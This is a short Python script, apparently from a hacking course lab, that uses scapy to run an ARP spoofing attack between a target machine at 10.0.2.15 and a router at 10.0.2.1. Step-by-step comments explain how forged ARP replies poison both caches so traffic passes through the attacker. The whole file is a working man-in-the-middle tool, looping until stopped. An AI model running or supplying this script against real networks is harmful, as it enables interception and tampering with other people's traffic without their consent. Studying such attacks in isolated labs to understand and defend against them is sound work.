#!usr/bin/nav/env python
import scapy.all as scapy
import time
def spoof(taget_ip, router_ip):
    # create packet
    # op is true by default(packet is a request)
    # for arp response op has to be set to 2
    # fool the target by acting as a router

    target_mac = get_mac(taget_ip)
    packet = scapy.ARP(op=2, pdst=taget_ip, hwdst=target_mac , psrc=router_ip)
    # print(packet.summary())

    # scapy.send sends the packet to the target and update router mac with host mac
    # testing - arp -a before and after. mac address of router will change for the victim#
    # (should be the mac address of the host after running)
    scapy.send(packet, verbose = False)


# scan ip and get the mac, same function from scan_network program
def get_mac(ipadress):
    # instance of an ARP - creating a packet
    # below code prints the variable names inside the class of arp_request
    # scapy.ls(scapy.ARP())

    arp_request = scapy.ARP()
    # creating a packet with the ipaddress
    arp_request.pdst = ipadress
    # print(arp_request.summary())

    #create a ether object and pass the mac address of broadcast
    # scapy.ls(scapy.Ether())
    broadcast = scapy.Ether()
    broadcast.dst = "ff:ff:ff:ff:Ff:ff"
    # print(broadcast.summary())

    # combining both arp_request and broadcast
    arp_request_broadcast = broadcast/arp_request
    # print(arp_request_broadcast.summary())
    # arp_request_broadcast.show  ()

    # sending the packet , verbose is to remover the header from the result(formatting)
    answered_list = scapy.srp(arp_request_broadcast, timeout =1, verbose = False)[0]
    return answered_list[0][1].hwsrc;

count =0;
while True:
    # mac address of router change back to the real mac everytime. So have to loop
    # until finish the attack to constanly inject mac address to fake routers mac with
    # hosts mac in the taget system
    spoof("10.0.2.15","10.0.2.1")
    # fooling the router to get the responses
    spoof("10.0.2.1","10.0.2.15")
    count+=2
    print("\r[+] Packets sent : " + str(count) , end = " ")
    time.sleep(2)